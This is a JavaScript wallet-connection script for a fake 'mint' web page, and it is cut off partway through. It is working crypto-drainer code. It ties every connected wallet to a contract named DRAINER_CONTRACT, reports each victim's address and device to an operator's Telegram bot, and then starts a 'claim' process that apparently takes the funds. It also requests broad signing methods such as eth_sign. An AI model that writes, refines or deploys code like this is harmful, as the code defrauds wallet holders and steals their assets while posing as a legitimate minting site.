import { CONFIG } from './config.js';

;(function () {
  'use strict';

  // ==========================================================================
  //  CONFIG
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const WC_ENABLE_SOFT_TIMEOUT   = 90_000;  // don't kill enable() — just stop waiting
  const WC_SESSION_POLL_INTERVAL = 1_000;   // poll provider.session
  const WC_SESSION_POLL_MAX      = 90_000;  // give up after 90s
  const LS_PENDING_KEY           = 'wc_pending_connect_v1';

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const getPlatform = () => {
    if (isIOSDevice) return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA))       return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isTrust || /TrustWallet/i.test(UA))             return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA))                                return { wallet: 'rainbow',  name: 'Rainbow' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  LIBRARY LOADING
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const modalCdn = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];

    const [EthereumProvider, WalletConnectModal, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m,   'EthereumProvider'),
      tryImport(modalCdn,    (m) => m.WalletConnectModal || m.default || m, 'Modal'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m,               'Web3'),
    ]);

    return { EthereumProvider, WalletConnectModal, Web3: Web3Mod.default || Web3Mod };
  }

  // ==========================================================================
  //  RELAY REACHABILITY (best-effort hint)
  // ==========================================================================
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch { /* try next */ }
    }
    logDebug('⚠️ No relay reachable — using default');
    return null;
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE
  // ==========================================================================
  let EthereumProvider   = null;
  let WalletConnectModal = null;
  let Web3Ctor           = null;

  let wcProvider         = null;   // singleton — never nulled while session active
  let injectedProvider   = null;
  let activeProvider     = null;
  let web3Instance       = null;
  let contractInstance   = null;
  let isConnecting       = false;
  let isDisconnecting    = false;
  let connectionMode     = null;   // 'walletconnect' | 'injected' | null

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  const LS = {
    addr:    'connectedWallet',
    mode:    'connectionMode',
    pending: LS_PENDING_KEY,
  };
  const saveWallet = (address, mode) => {
    localStorage.setItem(LS.addr, address);
    if (mode) localStorage.setItem(LS.mode, mode);
  };
  const getSavedWallet = () => localStorage.getItem(LS.addr);
  const getSavedMode   = () => localStorage.getItem(LS.mode);
  const clearSavedWallet = () => {
    localStorage.removeItem(LS.addr);
    localStorage.removeItem(LS.mode);
  };

  // ---------------------------------------------------------------------------
  // Pending-connect flag — survives page reload while wallet app is foregrounded
  // ---------------------------------------------------------------------------
  function markPendingConnect(mode) {
    try { sessionStorage.setItem(LS.pending, JSON.stringify({ mode, ts: Date.now() })); } catch {}
  }
  function clearPendingConnect() {
    try { sessionStorage.removeItem(LS.pending); } catch {}
  }
  function getPendingConnect() {
    try {
      const raw = sessionStorage.getItem(LS.pending);
      if (!raw) return null;
      const v = JSON.parse(raw);
      // Expire after 10 minutes
      if (Date.now() - v.ts > 10 * 60 * 1000) { clearPendingConnect(); return null; }
      return v;
    } catch { return null; }
  }

  // ==========================================================================
  //  GLOBAL PUBLISH  — matches script.js expectations exactly
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      mode: connectionMode,
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  SESSION RESOLUTION  — single source of truth for WC
  //
  //  provider.session is a getter that returns the *current* session object.
  //  provider.accounts is a getter that returns the *current* accounts array.
  //  Both are rehydrated by the SDK from localStorage on init.
  // ==========================================================================
  function getWCSessionAddress(provider) {
    if (!provider) return null;
    try {
      if (provider.session && Array.isArray(provider.accounts) && provider.accounts.length > 0) {
        return provider.accounts[0];
      }
    } catch {}
    return null;
  }

  function adoptWCSession(provider, address) {
    if (!provider || !address) return false;
    activeProvider    = provider;
    connectionMode    = 'walletconnect';
    web3Instance      = new Web3Ctor(provider);
    contractInstance  = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    saveWallet(address, 'walletconnect');
    clearPendingConnect();
    updateConnectedUI(address, 'evm');
    logDebug(`✅ WC session adopted: ${address}`);
    return true;
  }

  // ==========================================================================
  //  WALLETCONNECT PROVIDER SINGLETON
  // ==========================================================================
  let wcInitPromise = null;   // dedupe concurrent init calls

  async function initWalletConnect({ useFallbackId = false } = {}) {
    // Already have a live provider — return it
    if (wcProvider) return wcProvider;

    // In-flight init — await it
    if (wcInitPromise) return wcInitPromise;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No WalletConnect projectId configured');
      return null;
    }

    wcInitPromise = (async () => {
      try {
        const relayUrl = await pickRelayUrl();

        logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}…`);
        const t0 = performance.now();

        const opts = {
          projectId,
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
          showQrModal: false,
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
          events: ['chainChanged', 'accountsChanged'],
          metadata: DAPP_METADATA,
        };
        if (relayUrl) opts.relayUrl = relayUrl;

        const provider = await withTimeout(
          EthereumProvider.init(opts),
          20000,
          'EthereumProvider.init'
        );

        attachWCProviderEvents(provider);
        wcProvider = provider;
        logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);

        // ---- CRITICAL FIX ----
        // If the SDK rehydrated a session from localStorage (page reloaded
        // mid-connect, or wallet approved after our soft timeout), adopt it now.
        const restoredAddr = getWCSessionAddress(provider);
        if (restoredAddr && !activeProvider) {
          adoptWCSession(provider, restoredAddr);
        }
        // ----------------------

        return provider;
      } catch (e) {
        logDebug(`WC init failed: ${e.message}`);
        return null;
      } finally {
        wcInitPromise = null;
      }
    })();

    return wcInitPromise;
  }

  // ==========================================================================
  //  WALLETCONNECT EVENTS  — attached ONCE per provider
  // ==========================================================================
  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        // Some wallets fire this transiently during pairing. Only disconnect
        // if we were actually connected.
        if (connectionMode === 'walletconnect' && activeProvider === provider) {
          hardDisconnect({ skipWalletCall: true });
        }
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect');
      clearPendingConnect();
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 800);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      hardDisconnect({ skipWalletCall: true });
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      hardDisconnect({ skipWalletCall: true });
    });

    // Some versions emit session_event — belt & braces
    provider.on?.('session_event', (ev) => {
      logDebug(`WC session_event: ${JSON.stringify(ev?.params?.event || ev)}`);
    });
  }

  // ==========================================================================
  //  INJECTED EVM
  // ==========================================================================
  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
      } else {
        const a = accounts[0];
        saveWallet(a, 'injected');
        updateConnectedUI(a, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 800);
      }
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => {
      hardDisconnect({ skipWalletCall: true });
    });
  }

  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 400));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        30000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider   = provider;
      connectionMode   = 'injected';

      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      clearPendingConnect();
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT  — hardened
  // ==========================================================================
  async function connectWalletConnect({ useFallbackId = false } = {}) {
    const provider = await initWalletConnect({ useFallbackId });
    if (!provider) return null;

    // 1) Session already live (restore / prior approval)
    const existing = getWCSessionAddress(provider);
    if (existing) {
      if (!activeProvider) adoptWCSession(provider, existing);
      return existing;
    }

    // 2) Show our own QR modal (desktop only) before enable()
    let modalController = null;
    if (WalletConnectModal && !isMobileDevice) {
      try {
        modalController = new WalletConnectModal({
          projectId: useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
          enableExplorer: true,
        });
      } catch (e) { logDebug('Modal init: ' + e.message); }
    }

    // 3) One-shot display_uri handler
    let uriShown = false;
    const onUri = (uri) => {
      if (uriShown) return;
      uriShown = true;
      try { modalController?.openModal({ uri }); } catch (e) { logDebug('openModal: ' + e.message); }
    };
    provider.on('display_uri', onUri);

    showStatus('Opening wallet…', 'info');
    markPendingConnect('walletconnect');

    // 4) Kick off enable(). Do NOT let it kill the flow.
    //    On mobile the promise often rejects when the wallet app takes focus.
    //    The session may still settle on the relay — we poll for it below.
    let enableResult = null;
    let enableErr = null;
    const enablePromise = provider.enable()
      .then((a) => { enableResult = a; })
      .catch((e) => { enableErr = e; logDebug('enable() rejected: ' + e.message); });

    // Soft wait — 90 s or resolution, whichever first
    await Promise.race([
      enablePromise,
      new Promise((r) => setTimeout(r, WC_ENABLE_SOFT_TIMEOUT)),
    ]);

    // Remove our display_uri listener now that we're done
    try { provider.removeListener?.('display_uri', onUri); } catch {}

    // 5) If enable resolved with accounts → we're done.
    if (enableResult && enableResult.length > 0) {
      try { modalController?.closeModal(); } catch {}
      const address = enableResult[0];
      adoptWCSession(provider, address);
      logDebug(`✅ WC connected (enable): ${address}`);
      return address;
    }

    // 6) enable() may have failed OR timed out — poll provider.session
    //    for the next 90 seconds. This is the fix for "wallet says connected
    //    but site says Connecting forever".
    logDebug('Polling for WC session (wallet may still be approving)…');
    const address = await pollForWCSession(provider, WC_SESSION_POLL_MAX);

    try { modalController?.closeModal(); } catch {}

    if (address) {
      adoptWCSession(provider, address);
      logDebug(`✅ WC connected (poll): ${address}`);
      return address;
    }

    // 7) Nothing materialised.
    logDebug('❌ WC connect failed: ' + (enableErr?.message || 'timeout'));
    clearPendingConnect();
    return null;
  }

  // ---------------------------------------------------------------------------
  //  Poll provider.session / provider.accounts for up to `maxMs`
  // ---------------------------------------------------------------------------
  function pollForWCSession(provider, maxMs) {
    return new Promise((resolve) => {
      const started = Date.now();
      const tick = () => {
        // Hard requirement: provider must still be the live one
        if (provider !== wcProvider && provider !== activeProvider) {
          return resolve(null);
        }
        const a = getWCSessionAddress(provider);
        if (a) return resolve(a);
        if (Date.now() - started >= maxMs) return resolve(null);
        setTimeout(tick, WC_SESSION_POLL_INTERVAL);
      };
      tick();
    });
  }

  // ==========================================================================
  //  HARD DISCONNECT  — safe for WC, injected, and everything in between
  // ==========================================================================
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider) {
        try {
          if (wcProvider.session) {
            await Promise.race([
              wcProvider.disconnect(),
              new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 8000)),
            ]);
          }
        } catch (e) {
          logDebug('WC disconnect err: ' + e.message);
        }
      }

      if (connectionMode === 'injected' && injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      // Keep the provider object around so it can be reused, BUT drop our ref
      // ONLY after disconnect has completed. This is what prevents the
      // "site says disconnected but wallet still connected" bug.
      wcProvider        = null;
      injectedProvider  = null;
      activeProvider    = null;
      web3Instance      = null;
      contractInstance  = null;
      connectionMode    = null;
      clearPendingConnect();
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;

    try {
      const inWallet       = detectInWalletBrowser();
      const preferInjected = !!inWallet && isMobileDevice;

      if (preferInjected) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      } else if (isDesktopDevice && window.ethereum && evmProviders.length > 0) {
        address = await connectInjected();
      }

      if (!address) {
        address = await connectWalletConnect({ useFallbackId: false });
      }
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Retrying WC with fallback projectId…');
        address = await connectWalletConnect({ useFallbackId: true });
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT DISPATCHER
  // ==========================================================================
  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ==========================================================================
  //  VISIBILITYCHANGE  — mobile users returning from wallet app
  //
  //  This is the second half of the fix. When the user is on mobile and
  //  the wallet app backgrounds your dApp, the session approval completes
  //  asynchronously. When they return, this handler re-checks.
  // ==========================================================================
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState !== 'visible') return;
    // Only act if we have an in-flight connect OR a WC provider with a session
    const pending = getPendingConnect();
    const provider = wcProvider;
    if (!provider) return;

    setTimeout(() => {
      try {
        const addr = getWCSessionAddress(provider);
        if (addr && !activeProvider) {
          logDebug('🔄 Resolved session from visibilitychange');
          adoptWCSession(provider, addr);
          setButtonState(connectButton, 'connected');
          if (walletButton) setButtonState(walletButton, 'connected');
        } else if (!addr && pending && !isConnecting) {
          // No session materialised and no in-flight connect — reset UI
          if (getSavedWallet()) return; // keep existing
          showStatus('Connection cancelled', 'error');
          setButtonState(connectButton, 'normal');
          if (walletButton) setButtonState(walletButton, 'normal');
          clearPendingConnect();
        }
      } catch (e) { logDebug('visibilitychange handler: ' + e.message); }
    }, 500);
  });

  // ==========================================================================
  //  SESSION RESTORE  — on page load
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode   = getSavedMode();
    const pending     = getPendingConnect();

    // Even if no saved wallet, if there's a pending connect we still init WC
    // to see if the session settled on the relay while we were away.
    if (!savedWallet && !pending) return;

    // --- WalletConnect restore / pending resolution ---
    if (savedMode === 'walletconnect' || !savedMode || pending?.mode === 'walletconnect') {
      try {
        const provider = await initWalletConnect({ useFallbackId: false });
        if (provider) {
          const addr = getWCSessionAddress(provider);
          if (addr) {
            adoptWCSession(provider, addr);
            logDebug(`♻️ WC session restored: ${addr}`);
            return;
          }
          // Pending — poll briefly in case the wallet is about to settle
          if (pending?.mode === 'walletconnect') {
            const polled = await pollForWCSession(provider, 20_000);
            if (polled) {
              adoptWCSession(provider, polled);
              logDebug(`♻️ WC session resolved (pending): ${polled}`);
              return;
            }
          }
        }
      } catch (e) {
